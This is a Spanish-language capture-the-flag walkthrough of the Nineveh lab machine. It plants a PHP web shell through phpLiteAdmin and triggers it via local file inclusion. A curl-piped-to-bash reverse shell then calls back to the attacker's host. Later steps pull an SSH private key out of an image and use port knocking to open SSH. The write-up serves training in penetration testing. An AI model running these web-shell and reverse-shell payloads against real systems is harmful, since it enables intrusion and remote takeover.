## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion desde phpliteadmin {-}

1. Creamos una base de datos llamada hack.php

    ```{r, echo = FALSE, fig.cap="create hack.php database", out.width="90%"}
    knitr::include_graphics("images/phpliteadmin-hack-php.png")
    ```

    Si pinchamos el link de la hack.php database vemos que a sido creado en `/var/tmp/hack.php`

1. Creamos una tabla de una columna que contiene code PHP

    ```{r, echo = FALSE, fig.cap="create table test", out.width="90%"}
    knitr::include_graphics("images/phpliteadmin-create-table.png")
    ```

1. Entramos un comando PHP en la tabla

    ```{r, echo = FALSE, fig.cap="insert php command", out.width="90%"}
    knitr::include_graphics("images/phpliteadmin-insert-command.png")
    ```

    El comando es `<?php system($_REQUEST["cmd"]); ?>`

1. y con el uso de la LFI miramos lo que passa

    ```{r, echo = FALSE, fig.cap="phpliteadmin RCE", out.width="90%"}
    knitr::include_graphics("images/phpliteadmin-rce.png")
    ```

Ahora que tenemos posibilidades de ejecutar comandos de manera remota, vamos a tratar de ganar accesso al sistema.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos un archivo *index.html* que contiene

    ```html
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Compartimos un servidor web con *python*

    ```bash
    python3 -m http.server 80
    ```

1. Lanzamos la reverse shell por la web

    ```bash
    10.10.10.43/department/manage.php?notes=files/ninevehNotes/../var/tmp/hack.php&cmd=curl -s 10.10.14.8|bash
    ```
    
ya hemos ganado accesso al sistema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Analizamos el sistema {-}

```bash
pwd
ls -l
cd ..
ls
cd ..
ls
```

Aqui vemos que hay un directorio llamado `ssl` que contiene otro directorio `secure_notes` y como todo esto esta en `/var/www/html`
miramos en firefox lo que es. `https://10.10.10.43/secure_notes` y vemos una imagen. Como el directorio se llama secure_notes, pensamos 
directamente en steganografia y nos descargamos la image

### Analizando los bits menos significativos de la imagen {-}

```bash
steghide info nineveh.png
file nineveh.png
exiftool nineveh.png
strings nineveh.png
```

El comando strings nos muestra una key id_rsa privada y una publica del usuario amrois. Como no tenemos accesso al ssh desde fuera copiamos esta clave 
en la maquina victima y le hacemos el tratamiento de siempre

### Conexion por SSH {-}

En la maquina victima:

```bash
cd /tmp
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa amrois@localhost
```

Ya estamos conectados como amrois y podemos leer la flag.

### Otra manera de conectarnos a la maquina {-}

Si durante el analisis del sistema hubieramos ido hasta mirar los processos que estan habiertos en background, ubieramos encontrado que la utilidad
`knockd` estava lanzada.

**Knockd** es una utilidad para escuchar o lanzar Port Knocking.

```bash
ps -faux
cat /etc/knockd.conf
```

Aqui podemos ver que si Knockamos los puertos 571,290,911 se abriria el puerto 22 al exterior y si Knockeamos los puertos 911,290,571 se ceraria.

lo comprobamos desde la maquina de atacante:

```bash
nmap -p22 10.10.10.43 --open -T5 -v -n
```

Aqui vemos quel puerto 22 esta cerrado

```bash
knock 10.10.10.43 571:tcp 290:tcp 911:tcp
nmap -p22 10.10.10.43 --open -T5 -v -n
```

Aqui vemos que el puerto 22 se a abierto, y desde aqui nos podemos connectar por ssh como el usuario amrois.







